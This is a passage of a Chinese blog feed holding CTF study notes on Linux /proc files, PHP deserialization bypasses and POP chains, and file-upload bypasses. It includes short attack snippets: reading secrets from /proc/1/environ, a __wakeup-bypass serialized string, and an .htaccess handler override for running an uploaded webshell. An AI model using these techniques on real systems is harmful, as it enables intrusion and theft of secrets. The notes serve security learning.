title="用户与用户组管理"></a>用户与用户组管理</h2><h3 id="创建账号"><a href="#创建账号" class="headerlink" title="创建账号"></a>创建账号</h3><p>语法：useradd -p username</p><p>允许多个参数并列</p><p>参数：</p><ul><li>-c comment 指定一段注释性描述。</li><li>-d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。</li><li>-g 用户组 指定用户所属的用户组。</li><li>-G 用户组，用户组 指定用户所属的附加组。</li><li>-s Shell文件 指定用户的登录Shell。</li><li>-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。</li></ul><p>例子：</p><p>useradd –d  &#x2F;home&#x2F;sam -m sam</p><p>useradd -s &#x2F;bin&#x2F;sh -g group –G adm,root gem</p><h3 id="删除账号"><a href="#删除账号" class="headerlink" title="删除账号"></a>删除账号</h3><p>语法：userdel -p username</p><blockquote><p>常用的选项(参数)是 <strong>-r</strong>，它的作用是把用户的主目录一起删除。</p><p>例如：</p><pre><code class="highlight plaintext"># userdel -r sam</code></pre><p>此命令删除用户sam在系统文件中（主要是&#x2F;etc&#x2F;passwd, &#x2F;etc&#x2F;shadow, &#x2F;etc&#x2F;group等）的记录，同时删除用户的主目录。</p></blockquote><h3 id="修改账号"><a href="#修改账号" class="headerlink" title="修改账号"></a>修改账号</h3><p>语法：usermod -p username</p><p>参数如创建账号所写</p><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><h4 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h4><h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><blockquote><p>Shell 是一个用 C 语言编写的程序，它是用户使用 Linux 的桥梁。Shell 既是一种命令语言，又是一种程序设计语言。</p><p>Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务。</p><p>Ken Thompson 的 sh 是第一种 Unix Shell，Windows Explorer 是一个典型的图形界面 Shell。</p></blockquote><h5 id="shell环境"><a href="#shell环境" class="headerlink" title="shell环境"></a>shell环境</h5><blockquote><p>Shell 编程跟 JavaScript、php 编程一样，只要有一个能编写代码的文本编辑器和一个能解释执行的脚本解释器就可以了。</p><p>在一般情况下，人们并不区分 Bourne Shell 和 Bourne Again Shell，所以，像 <strong>#!&#x2F;bin&#x2F;sh</strong>，它同样也可以改为 <strong>#!&#x2F;bin&#x2F;bash</strong>。</p><p><strong>#!</strong> 告诉系统其后路径所指定的程序即是解释此脚本文件的 Shell 程序。</p></blockquote><h5 id="运行shell脚本"><a href="#运行shell脚本" class="headerlink" title="运行shell脚本"></a>运行shell脚本</h5><p>第一个方法：<strong>作为可执行程序</strong></p><p>第二个方法：<strong>作为解释器参数</strong></p><p>这种运行方式是，直接运行解释器，其参数就是 shell 脚本的文件名，如：</p><pre><code class="highlight plaintext">/bin/sh test.sh/bin/php test.php</code></pre><h4 id="shell变量"><a href="#shell变量" class="headerlink" title="shell变量"></a>shell变量</h4><p>1.定义变量不需要符号，变量赋值时等号两边没有空格，剩下的与C语言类似，如下：</p><ul><li><strong>只包含字母、数字和下划线：</strong> 变量名可以包含字母（大小写敏感）、数字和下划线 **_**，不能包含其他特殊字符。</li><li><strong>不能以数字开头：</strong> 变量名不能以数字开头，但可以包含数字。</li><li><strong>避免使用 Shell 关键字：</strong> 不要使用Shell的关键字（例如 if、then、else、fi、for、while 等）作为变量名，以免引起混淆。</li><li><strong>使用大写字母表示常量：</strong> 习惯上，常量的变量名通常使用大写字母，例如 <strong>PI&#x3D;3.14</strong>。</li><li><strong>避免使用特殊符号：</strong> 尽量避免在变量名中使用特殊符号，因为它们可能与 Shell 的语法产生冲突。</li><li><strong>避免使用空格：</strong> 变量名中不应该包含空格，因为空格通常用于分隔命令和参数。</li></ul><p>2.使用已定义变量时前面加一个$，最好在变量名外围加一个花括号，如：${name}</p><p>3.只读变量：使用 readonly 命令可以将变量定义为只读变量，只读变量的值不能被改变。</p><p>4.删除变量：</p><p>使用 unset 命令可以删除变量。语法：</p><pre><code class="highlight plaintext">unset variable_name</code></pre><p>变量被删除后不能再次使用。unset 命令不能删除只读变量。</p><h2 id="proc目录"><a href="#proc目录" class="headerlink" title="&#x2F;proc目录"></a>&#x2F;proc目录</h2><p>推荐文章：<a href="https://www.anquanke.com/post/id/241148">Proc 目录在 CTF 中的利用-安全客 - 安全资讯平台 (anquanke.com)</a></p><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><blockquote><p>Linux系统上的&#x2F;proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p><p>简单来讲，<code>/proc</code> 目录即保存在系统内存中的信息，大多数虚拟文件可以使用文件查看命令如cat、more或者less进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。</p></blockquote><p>&#x2F;proc目录下有数字进程也有字符串，我们一般用<code>1</code>或者<code>self</code></p><p>下面说一下进程下比较重要的目录和文件</p><h3 id="cmdline（文件而非目录）"><a href="#cmdline（文件而非目录）" class="headerlink" title="cmdline（文件而非目录）"></a>cmdline（文件而非目录）</h3><blockquote><p>cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令</p></blockquote><p>example：<code>cat /proc/1/cmdline</code> </p><p>其实通过<code>cat</code>可知cmdline是个文件而不是目录，使用<code>ls</code>并没有效果</p><h3 id="cwd-一个符号链接"><a href="#cwd-一个符号链接" class="headerlink" title="cwd(一个符号链接)"></a>cwd(一个符号链接)</h3><blockquote><p>cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录</p></blockquote><blockquote><p>符号链接是一种特殊类型的文件，它包含了对另一个文件或目录的引用。通过读取<code>/proc/1/cwd</code>可以获取进程ID为1的进程的当前工作目录的路径信息。</p></blockquote><p>example：<code>ls -al /proc/1/cwd</code></p><p>通过cwd返回的是一个字典，具体的还不会说，不过不能用<code>cat</code>，使用<code>ls</code></p><h3 id="exe-一个符号链接"><a href="#exe-一个符号链接" class="headerlink" title="exe(一个符号链接)"></a>exe(一个符号链接)</h3><blockquote><p>exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径</p></blockquote><p>example：<code>ls -al /proc/1/exe</code></p><p>可以cat试试，好像跟逆向有关</p><h3 id="environ（文件而非目录）"><a href="#environ（文件而非目录）" class="headerlink" title="environ（文件而非目录）"></a>environ（文件而非目录）</h3><blockquote><p>environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息。常用来读取环境变量中的SECRET_KEY或FLAG。</p></blockquote><p>example：cat &#x2F;proc&#x2F;1&#x2F;environ</p><p>使用<code>cat</code>而非<code>ls</code></p><h3 id="fd（目录而非文件）"><a href="#fd（目录而非文件）" class="headerlink" title="fd（目录而非文件）"></a>fd（目录而非文件）</h3><blockquote><p>fd 是一个目录，里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。</p></blockquote><p>example：<code>ls -al /proc/1/fd</code></p><p>查看指定进程打开的某个文件的内容：<code>ls -al /proc/1/fd/7</code></p><blockquote><p><strong>这个fd比较重要，因为在 linux 系统中，如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 反序列化入门</title>
      <link href="/2024/03/18/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化入门"><a href="#PHP反序列化入门" class="headerlink" title="PHP反序列化入门"></a>PHP反序列化入门</h1><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><pre><code class="highlight plaintext">序列化:将变量转换为可保存或传输的字符串的过程；反序列化:在适当的时候把这个字符串再转化成原来的变量使用。优点:这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</code></pre><p>举个栗子：将木桌拆分成木块，是为序列化；将木块重组成木桌，是为反序列化。</p><h4 id="PHP序列化的字母标识："><a href="#PHP序列化的字母标识：" class="headerlink" title="PHP序列化的字母标识："></a>PHP序列化的字母标识：</h4><blockquote><p><code>a - array</code></p><p><code>b - boolean</code></p><p><code>d - double</code></p><p><code>i - integer</code></p><p><code>o - common object</code></p><p><code>r - reference</code></p><p><code>s - string</code></p><p><code>C - custom object</code></p><p><code>O - class</code></p><p><code>N - null</code></p><p><code>R - pointer reference</code></p><p><code>U - unicode string</code></p><p><code>N - NULL</code></p></blockquote><p>解释：</p><ul><li><strong>a - 数组（array）：</strong> 通常指存储相同类型元素的数据结构，这些元素在内存中是连续存储的。数组具有索引，可以有效地访问元素。</li><li><strong>b - 布尔（boolean）：</strong> 布尔是一种数据类型，只能取两个值，通常为true（真）或false（假）。它通常用于条件表达式。</li><li><strong>d - 双精度浮点数（double）：</strong> Double是一种用于表示带有双精度的浮点数（带有小数点的数）的数据类型。</li><li><strong>i - 整数（integer）：</strong> 整数是一种用于表示没有小数点的整数的数据类型。它可以是正数或负数。</li><li><strong>o - 通用对象（common object）：</strong> 这通常指编程上的一般对象。术语“通用对象”可能会根据特定的上下文或编程语言而有所不同。</li><li><strong>r - 引用（reference）：</strong> 引用是一个值，它引用另一个对象的内存位置。通常用于避免复制大量数据。</li><li><strong>s - 字符串（string）：</strong> 字符串是字符的序列。在编程中，它是用于表示文本的数据类型。</li><li><strong>C - 自定义对象（custom object）：</strong> 这指的是自定义类的对象，自定义类是面向对象编程中用户定义的数据类型。</li><li><strong>O - 类（class）：</strong> 在面向对象编程中，类是创建对象的蓝图。对象是类的实例，可以具有属性和方法。</li><li><strong>N - 空（null）：</strong> Null是一个特殊的值，表示没有值或不指向任何对象的引用。</li><li><strong>R - 指针引用（pointer reference）：</strong> 这可能是指使用指针实现的引用。指针存储内存地址，通常用于更直接的内存操作。</li><li><strong>U - Unicode字符串（unicode string）：</strong> Unicode字符串是使用Unicode标准编码的字符序列，可以表示各种书写系统中的广泛字符。</li><li><strong>N - 空（NULL）：</strong> 类似于前面的“null”，这可能指的是空值或没有值。确切的解释可能取决于特定的编程语言或上下文。</li></ul><h4 id="private和-protected详解"><a href="#private和-protected详解" class="headerlink" title="private和 protected详解"></a>private和 protected详解</h4><pre><code class="highlight plaintext">PHP 序列化的时候 private和 protected 变量会引入不可见字符%00，%00类名%00属性名 为private，%00*%00属性名 为protected，注意这两个 %00就是 ascii 码为0 的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚.我们可以将序列化的字符用urlencode编码之后,打印出来查看.</code></pre><h4 id="PHP常见魔术方法"><a href="#PHP常见魔术方法" class="headerlink" title="PHP常见魔术方法"></a>PHP常见魔术方法</h4><blockquote><p>__construct 当一个对象创建时被调用，</p><p>__destruct 当一个对象销毁时被调用，</p><p>__toString 当一个对象被当作一个字符串被调用。</p><p>__wakeup() 使用unserialize时触发</p><p>__sleep() 使用serialize时触发</p><p>__call() 对不存在的方法或者不可访问的方法进行调用就自动调用</p><p>__callStatic() 在静态上下文中调用不可访问的方法时触发</p><p>__get() 用于从不可访问的属性读取数据</p><p>__set() 在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用</p><p>__isset() 在不可访问的属性上调用isset()或empty()触发</p><p>__unset() 在不可访问的属性上使用unset()时触发</p><p>__toString() 把类当作字符串使用时触发,返回值需要为字符串</p><p>__invoke() 当脚本尝试将对象调用为函数时触发</p></blockquote><p>详细介绍：<a href="https://www.freebuf.com/articles/web/347246.html">PHP反序列化入门手把手详解 - FreeBuf网络安全行业门户</a></p><h3 id="魔术方法执行顺序"><a href="#魔术方法执行顺序" class="headerlink" title="魔术方法执行顺序"></a>魔术方法执行顺序</h3><p>推荐文章：[<a href="https://juejin.cn/post/7306019536812326946#heading-13">CTF&#x2F;Web] PHP 反序列化学习笔记 - 掘金 (juejin.cn)</a></p><blockquote><p>对于魔术方法的调用顺序, 不同的情况下会有不同的顺序</p><p>首先, 一个对象在其生命周期中一定会走过 <code>destruct</code>, 只有当对象没有被任何变量指向时才会被回收</p><p>当使用 <code>new</code> 关键字来创建一个对象时会调用 <code>construct</code></p></blockquote><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>推荐文章：<a href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/</a></p><h4 id="绕过-wakeup-CVE-2016-7124"><a href="#绕过-wakeup-CVE-2016-7124" class="headerlink" title="绕过__wakeup()(CVE-2016-7124)"></a>绕过__wakeup()(CVE-2016-7124)</h4><p>条件：<strong>php版本 PHP5&lt;5.6.25，PHP7 &lt; 7.0.10</strong></p><p>须知：__wakeup()魔术方法在执行<code>unserialize()</code>时，会<strong>优先</strong>调用这个函数，而不会执行<code>__construct()</code> 函数</p><p>绕过方法：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行**</p><p>举个栗子： <code>O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;</code></p><p>改成：O:4:”test”:10000086:{s:1:”a”;s:3:”abc”;}</p><p>反序列化时不会执行__wakeup()</p><h4 id="绕过-destruct"><a href="#绕过-destruct" class="headerlink" title="绕过__destruct()"></a>绕过__destruct()</h4><blockquote><pre><code class="highlight plaintext">__destruct`是PHP对象的一个魔术方法，称为析构函数，顾名思义这是当该对象被销毁的时候自动执行的一个函数。其中以下情况会触发`__destruct</code></pre><ul><li><p>主动调用<code>unset($obj)</code></p></li><li><p>主动调用<code>$obj = NULL</code></p></li><li><p>程序自动结束</p></li></ul></blockquote><blockquote><p>PHP还拥有<strong>垃圾回收Garbage collection</strong>即我们常说的<strong>GC机制</strong>。</p><p><strong>当一个对象没有任何引用</strong>的时候，则会被视为“垃圾”</p></blockquote><h4 id="绕过正则"><a href="#绕过正则" class="headerlink" title="绕过正则"></a>绕过正则</h4><blockquote><p>如<code>preg_match(&#39;/^O:\d+/&#39;)</code>匹配序列化字符串是否是对象字符串开头</p><p>绕过方法</p><ul><li>利用加号绕过（注意在url里传参时+要编码为%2B）</li><li>利用数组对象绕过，如 <code>serialize(array($a));</code> a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</li></ul></blockquote><p>例子：</p><pre><code class="highlight php"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>;<span class="comment">// +号绕过</span><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$a</span>);<span class="title function_ invoke__">unserialize</span>(<span class="keyword">match</span>(<span class="variable">$b</span>));<span class="comment">// 将对象放入数组绕过 serialize(array($a));</span><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;</span>);</code></pre><h4 id="利用引用绕过"><a href="#利用引用绕过" class="headerlink" title="利用引用绕过"></a>利用引用绕过</h4><blockquote><p>在 PHP 中，引用是一种变量的别名。当你创建一个变量并将其赋值给另一个变量时，这两个变量实际上引用了相同的数据。这意味着对其中一个变量的更改也会影响到另一个变量，因为它们指向相同的内存位置。</p></blockquote><blockquote><p><code>$a = 5;</code></p><p><code>$b = &amp;$a; // $b 现在是 $a 的引用</code></p></blockquote><blockquote><p><code>echo $a; // 输出 5 </code></p><p><code>echo $b; // 输出 5 </code></p></blockquote><blockquote><p><code>$a = 10; // 修改 $a </code></p><p><code>echo $b; // 输出 10，因为 $b 是 $a 的引用</code></p></blockquote><p>跟C语言的指针不同</p><h4 id="16进制绕过字符的过滤"><a href="#16进制绕过字符的过滤" class="headerlink" title="16进制绕过字符的过滤"></a>16进制绕过字符的过滤</h4><p>序列字符串中<strong>表示字符类型的s大写时，会被当成16进制解析。</strong></p><p>没见过，先不记笔记。</p><h3 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h3><p>推荐文章：<a href="https://cjlusec.ldxk.edu.cn/2023/02/15/pop/#POP%E9%93%BE%E4%BB%8B%E7%BB%8D">https://cjlusec.ldxk.edu.cn/2023/02/15/pop/#POP%E9%93%BE%E4%BB%8B%E7%BB%8D</a></p><p>介绍：是一条思路链。</p><blockquote><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的</p><p>说的再具体一点就是 ROP 是通过栈溢出实现控制指令的执行流程，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。</p></blockquote><p>下面着重讲解一题：</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><pre><code class="highlight php"><span class="meta">&lt;?php</span><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span><span class="class"></span>&#123;    <span class="keyword">public</span> <span class="variable">$mod1</span>;    <span class="keyword">public</span> <span class="variable">$mod2</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span><span class="function">    </span>&#123;        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test1</span>();    &#125;&#125;<span class="class"><span class="keyword">class</span> <span class="title">Call</span></span><span class="class"></span>&#123;    <span class="keyword">public</span> <span class="variable">$mod1</span>;    <span class="keyword">public</span> <span class="variable">$mod2</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span><span class="function">    </span>&#123;        <span class="variable language_">$this</span>-&gt;mod1-&gt;<span class="title function_ invoke__">test2</span>();    &#125;&#125;<span class="class"><span class="keyword">class</span> <span class="title">funct</span></span><span class="class"></span>&#123;    <span class="keyword">public</span> <span class="variable">$mod1</span>;    <span class="keyword">public</span> <span class="variable">$mod2</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$test2</span>,<span class="variable">$arr</span></span>)</span><span class="function">    </span>&#123;        <span class="variable">$s1</span> = <span class="variable language_">$this</span>-&gt;mod1;        <span class="variable">$s1</span>();    &#125;&#125;<span class="class"><span class="keyword">class</span> <span class="title">func</span></span><span class="class"></span>&#123;    <span class="keyword">public</span> <span class="variable">$mod1</span>;    <span class="keyword">public</span> <span class="variable">$mod2</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span><span class="function">    </span>&#123;        <span class="variable language_">$this</span>-&gt;mod2 = <span class="string">&quot;字符串拼接&quot;</span>.<span class="variable language_">$this</span>-&gt;mod1;    &#125;&#125;<span class="class"><span class="keyword">class</span> <span class="title">string1</span></span><span class="class"></span>&#123;    <span class="keyword">public</span> <span class="variable">$str1</span>;    <span class="keyword">public</span> <span class="variable">$str2</span>;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span><span class="function">    </span>&#123;        <span class="variable language_">$this</span>-&gt;str1-&gt;<span class="title function_ invoke__">get_flag</span>();        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;    &#125;&#125;<span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span><span class="class"></span>&#123;    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span><span class="function">    </span>&#123;        <span class="keyword">echo</span> <span class="string">&quot;flag:&quot;</span>.<span class="string">&quot;xxxxxxxxxxxx&quot;</span>;    &#125;&#125;<span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;string&#x27;</span>];<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);<span class="meta">?&gt;</span></code></pre><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>一般采用倒推法：</p><p>找到flag执行处：<code>get_flag()方法</code>，须使string1类的<code>str1 = GetFlag</code>类的对象；</p><p>可是执行$this-&gt;str1-&gt;get_flag();的条件是__toString()魔术方法，须使string1的对象被读取，利用这个：<code>$this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1</code>，使这里的<code>mode2 = string1</code>类的对象；</p><p>可是执行<code>$this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1</code>的条件是 __invoke()，这段代码符合：<code>$s1 = $this-&gt;mod1; $s1();</code> 因为这段代码在funct类中，需要符合<code>__call</code>魔术方法；</p><p>可是执行<code>__call</code>魔术方法的条件是：对不存在的方法或者不可访问的方法进行调用就自动调用。使Call类的mod1 &#x3D; funct类对象。可是test1()方法需要在start_gg类的mod1激活；</p><p>令start_gg类的mod1 &#x3D; Call类的mod1。</p><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><p>找到链尾，一步一步溯源直到链头。中间需要满足各种条件，当然一般会有一些暗示。</p>]]></content>
      
      
      <categories>
          
          <category> 反序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传入门</title>
      <link href="/2024/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="文件上传入门"><a href="#文件上传入门" class="headerlink" title="文件上传入门"></a>文件上传入门</h1><p>推荐文章：<a href="https://cloud.tencent.com/developer/article/1938541">超详细文件上传漏洞总结分析-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我只能浅显地说：在要上传的文件里构造语句并按照特定的方式进行上传，以达到攻击者的目的。</p><h2 id="限制措施及绕过"><a href="#限制措施及绕过" class="headerlink" title="限制措施及绕过"></a>限制措施及绕过</h2><h3 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>前端检测主要是通过JavaScript语句。</p><p>附：如果检测失败则不会发出请求，也就是不会发包。</p><h4 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h4><blockquote><p>前端验证通过以后，表单成功提交后会通过浏览器发出─条网络请求，但是如果前端验证不成功，则不会发出这项网络请求;可以在浏览器的网络元素中查看是否发出了网络请求。</p></blockquote><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><h5 id="方法一：改变前端"><a href="#方法一：改变前端" class="headerlink" title="方法一：改变前端"></a>方法一：改变前端</h5><p>F12修改source的JavaScript代码，或者直接禁用JavaScript</p><h5 id="方法二：骗过前端"><a href="#方法二：骗过前端" class="headerlink" title="方法二：骗过前端"></a>方法二：骗过前端</h5><p>文件名是name.png，在bp抓包后改成name.php</p><p>须知：只有前端通过后才能发包，bp这时才能抓包</p><h3 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h3><h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><blockquote><p><code>MIME(Multipurpose Internet Mail Extensions)</code>多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。</p></blockquote><h5 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h5><blockquote><p><code>text/plain</code> （纯文本）  <code>text/html</code> （HTML文档）  <code>text/javascript</code> （js代码）  <code>application/xhtml+xml</code> （XHTML文档）  <code>image/gif</code> （GIF图像）  <code>image/jpeg</code> （JPEG图像）  <code>image/png</code> （PNG图像）  <code>video/mpeg</code> （MPEG动画）  <code>application/octet-stream</code> （二进制数据）  <code>application/pdf</code> （PDF文档）</p></blockquote><h5 id="检测方式"><a href="#检测方式" class="headerlink" title="检测方式"></a>检测方式</h5><blockquote><p>         在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型<code>file_type</code>；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的<code>file_type</code>进行对比，如果符合要求就允许上传这个文件。</p></blockquote><h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><p>传<code>name.php</code>，bp抓包直接改成<code>image/png</code>等等</p><h3 id="htaccess文件解析漏洞"><a href="#htaccess文件解析漏洞" class="headerlink" title=".htaccess文件解析漏洞"></a><code>.htaccess</code>文件解析漏洞</h3><h4 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><blockquote><p><code>.htaccess文件(或者&quot;分布式配置文件&quot;)</code> ,全称是<code>Hypertext Access(超文本入口)</code>。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p></blockquote><h5 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h5><blockquote><p>web具体应用没有禁止.htaccess文件的上传，同时web服务器提供商允许用户上传自定义的<code>.htaccess文件</code></p></blockquote><h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><blockquote><p>上传覆盖<code>.htaccess文件</code>，重写<code>解析规则</code>，将上传的带有脚本马的图片以脚本方式解析。</p></blockquote><h4 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h4><p>第一步：</p><p>先命名成a.htaccess，bp抓包改成<code>.htaccess</code>即可，内容为：</p><p><code>&lt;FilesMatch &quot;js&quot;&gt;</code><br> <code>SetHandler application/x-httpd-php</code><br><code>&lt;/FilesMatch&gt;</code></p><p>再写个木马，改名为name.js</p><p>此时js文件会按照php文件被解析，也就是<code>name.js</code>被当成<code>php</code>文件执行，然后开蚁剑。</p><p>注意点：</p><p>.htaccess是全名，但不能直接在Windows命名，在bp上改</p><p>补录：<a href="https://we11s.github.io/posts/154257042/">https://we11s.github.io/posts/154257042/</a></p><h4 id="htaccess使用模板"><a href="#htaccess使用模板" class="headerlink" title=".htaccess使用模板"></a><code>.htaccess</code>使用模板</h4><pre><code class="highlight plaintext">#对于phpAddType application/x-httpd-php .html  #将html文件作为php文件进行解析#对于pythonAddHandler cgi-script .py #将html文件作为php文件进行解析Options +ExecCGI  #对于PerlAddHandler cgi-script .cgi .plOptions +ExecCGI</code></pre><h3 id="user-ini文件包含漏洞"><a href="#user-ini文件包含漏洞" class="headerlink" title=".user.ini文件包含漏洞"></a>.user.ini文件包含漏洞</h3><h4 id="基础-2"><a href="#基础-2" class="headerlink" title="基础"></a>基础</h4><blockquote><p>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们可以自定义除了PHP_INI_SYSTEM以外的模式，在执行php代码之前，系统会对.user.ini先做一个执行，然后才执行其他的php文件。</p><p>我们这边利用.user,ini先执行auto_prepend_file函数，auto_prepend_file表示在php程序加载第一个php代码前加载的php文件，也就是先加载了a.jpg里面的文件，即一句话木马。</p><p>原文链接：<a href="https://blog.csdn.net/hxhxhxhxx/article/details/107165508">https://blog.csdn.net/hxhxhxhxx/article/details/107165508</a></p></blockquote><p>须知：.user.ini配置文件是PHP的，可以在全部环境里生效，而.htaccess配置文件是Apache特有</p><h4 id="利用"><a href="#利用" class="headerlink" 